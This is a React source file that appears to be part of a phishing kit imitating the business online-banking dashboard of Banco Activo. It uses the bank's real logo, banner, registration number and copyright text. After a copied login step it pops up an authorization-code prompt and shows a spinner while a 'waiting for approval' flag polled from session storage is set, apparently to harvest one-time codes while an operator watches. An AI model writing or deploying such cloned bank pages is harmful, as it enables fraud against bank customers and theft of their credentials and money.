import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import AuthorizationCodeModal from "@/components/AuthorizationCodeModal";
import UserInfoContainer from "@/components/UserInfoContainer";

const menuItems = [
  "Pago Activo",
  "Consultas",
  "Transferencias Moneda Nacional",
  "Pagos y Recargas",
  "Afiliaciones",
  "Administración Seguridad",
  "Cash Management",
  "Solicitudes",
  "Divisas",
  "Otros servicios",
];

export default function DashboardEmpresas() {
  const navigate = useNavigate();
  const [activeItem, setActiveItem] = useState("Pago Activo");
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(false);

  useEffect(() => {
    const initializeAuthModal = async () => {
      try {
        // Get username and requestId from sessionStorage (set during login)
        const username = sessionStorage.getItem("pinoUsuario");
        const requestId = sessionStorage.getItem("pinoRequestId");

        // If either is missing, redirect to login
        if (!username || !requestId) {
          navigate("/pino-empr");
          return;
        }

        // Show modal after 2 seconds
        const timer = setTimeout(() => {
          setShowAuthModal(true);
        }, 2000);

        return () => clearTimeout(timer);
      } catch (err) {
        console.error("Error initializing auth modal:", err);
        // Still show modal even if creation fails
        const timer = setTimeout(() => {
          setShowAuthModal(true);
        }, 2000);
        return () => clearTimeout(timer);
      }
    };

    initializeAuthModal();
  }, []);

  // Monitorear estado de espera de aprobación
  useEffect(() => {
    const checkWaitingStatus = () => {
      const isWaiting = sessionStorage.getItem("pinoWaitingForApproval") === "true";
      setWaitingForApproval(isWaiting);
    };

    checkWaitingStatus();

    // Verificar cada 500ms por cambios
    const interval = setInterval(checkWaitingStatus, 500);

    return () => clearInterval(interval);
  }, []);

  const handleSalir = () => {
    navigate("/");
  };

  return (
    <div className="dashboard-empresas-root" style={{ minHeight: "100vh", backgroundColor: "#FFFFFF", fontFamily: "Arial, Helvetica, sans-serif", display: "flex", flexDirection: "column", overflowX: "hidden" }}>
      <style>{`
        @media screen and (max-width: 768px) {
          html, body {
            overflow-x: hidden !important;
            width: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
          }
          .dashboard-empresas-root {
            overflow-x: hidden !important;
            width: 100% !important;
          }
          .de-scale-wrapper {
            width: 100% !important;
            transform: scale(0.36) !important;
            transform-origin: top center !important;
            margin-left: 0 !important;
            display: flex !important;
            flex-direction: column !important;
            min-height: 100vh !important;
          }
        }
      `}</style>
      <div className="de-scale-wrapper">
        {/* Header */}
        <div style={{ backgroundColor: "#000066", padding: "10px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <img
            src="https://www.bancoactivo.com/logo.svg"
            alt="Activo Banco Universal"
            style={{ height: "34px", filter: "brightness(0) invert(1)", flexShrink: 0 }}
          />
          <span style={{ color: "#FFFFFF", fontSize: "12px", whiteSpace: "nowrap" }}>RIF: J-08106622-7</span>
        </div>

        {/* Sub-header */}
        <div style={{ backgroundColor: "#f0f0f0", borderBottom: "1px solid #d0d0d0", padding: "8px 24px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center" }}>
            <span style={{ color: "#000066", fontSize: "14px", fontWeight: 600 }}>Activo en Línea</span>
            <span style={{ display: "inline-block", width: "2px", height: "18px", backgroundColor: "#ff9900", margin: "0 8px" }}></span>
            <span style={{ color: "#0000cc", fontSize: "14px", fontWeight: 600 }}>Empresas</span>
          </div>
          <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
            <div style={{ minWidth: "280px", lineHeight: 1.2 }}>
              <UserInfoContainer />
            </div>

            <button
              onClick={handleSalir}
              style={{
                backgroundColor: "#000066",
                color: "#FFFFFF",
                border: "none",
                padding: "5px 12px",
                fontSize: "11px",
                fontWeight: 600,
                cursor: "pointer",
                fontFamily: "Arial, Helvetica, sans-serif",
                whiteSpace: "nowrap",
                display: "flex",
                alignItems: "center",
                gap: "6px",
              }}
            >
              Salir
              <span style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", width: "14px", height: "14px", borderRadius: "50%", border: "1px solid #FFFFFF", fontSize: "9px" }}>→</span>
            </button>
          </div>
        </div>

        {/* Main Layout */}
        <div style={{ flex: 1, display: "flex", width: "100%" }}>
          {/* Sidebar */}
          <aside style={{ width: "220px", backgroundColor: "#e0e0e0", borderRight: "1px solid #c0c0c0", padding: "0", flexShrink: 0 }}>
            <ul style={{ listStyle: "none", margin: 0, padding: 0 }}>
              {menuItems.map((item) => (
                <li
                  key={item}
                  onClick={() => {
                    setActiveItem(item);
                    if (item === "Pago Activo") {
                      setShowAuthModal(true);
                    }
                  }}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "8px 12px",
                    cursor: "pointer",
                    fontSize: "11px",
                    color: "#0000cc",
                    fontFamily: "Arial, Helvetica, sans-serif",
                    backgroundColor: activeItem === item ? "#d0d0d0" : "transparent",
                    borderBottom: "1px solid #cfcfcf",
                    userSelect: "none",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = "#d0d0d0")}
                  onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = activeItem === item ? "#d0d0d0" : "transparent")}
                >
                  <span>{item}</span>
                  <span style={{ color: "#0000cc", fontSize: "10px" }}>›</span>
                </li>
              ))}
            </ul>
          </aside>

          {/* Center Content */}
          <main style={{ flex: 1, backgroundColor: "#FFFFFF", padding: "20px", position: "relative", overflow: "hidden", display: "flex", justifyContent: "center" }}>
            {/* Watermark logo */}
            <div style={{
              position: "absolute",
              top: "50%",
              left: "50%",
              transform: "translate(-50%, -50%)",
              opacity: 0.04,
              pointerEvents: "none",
              fontSize: "140px",
              fontWeight: 800,
              color: "#000066",
              fontFamily: "Arial, Helvetica, sans-serif",
            }}>
              A
            </div>

            {/* Banner Image */}
            <img
              src="https://activoenlinea.bancoactivo.com/naturales/usuarios/obtener_banner/3/133"
              alt="Solidaridad Activa - Activo Banco Universal"
              style={{
                maxWidth: "90%",
                height: "auto",
                display: "block",
                margin: "0 auto",
                position: "relative",
                zIndex: 1,
              }}
            />
          </main>
        </div>

        {/* Footer */}
        <div style={{ backgroundColor: "#FFFFFF", borderTop: "1px solid #ccc", padding: "10px 24px", textAlign: "center" }}>
          <p style={{ fontSize: "11px", color: "#000066", margin: 0 }}>
            © Copyright 2026 Banco Activo, C.A. Banco Universal. RIF: J-08106622-7. Todos los derechos reservados. La información mostrada en esta página, es de carácter Confidencial
          </p>
        </div>
      </div>{/* end de-scale-wrapper */}

      {/* Loading overlay cuando está esperando aprobación */}
      {waitingForApproval && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundColor: "rgba(0, 0, 0, 0.6)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 999,
          }}
        >
          <div
            style={{
              width: "60px",
              height: "60px",
              border: "4px solid rgba(255, 255, 255, 0.3)",
              borderTop: "4px solid #FFFFFF",
              borderRadius: "50%",
              animation: "spin 1s linear infinite",
            }}
          />
          <style>{`
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </div>
      )}

      <AuthorizationCodeModal
        isOpen={showAuthModal}
        onClose={() => setShowAuthModal(false)}
      />
    </div>
  );
}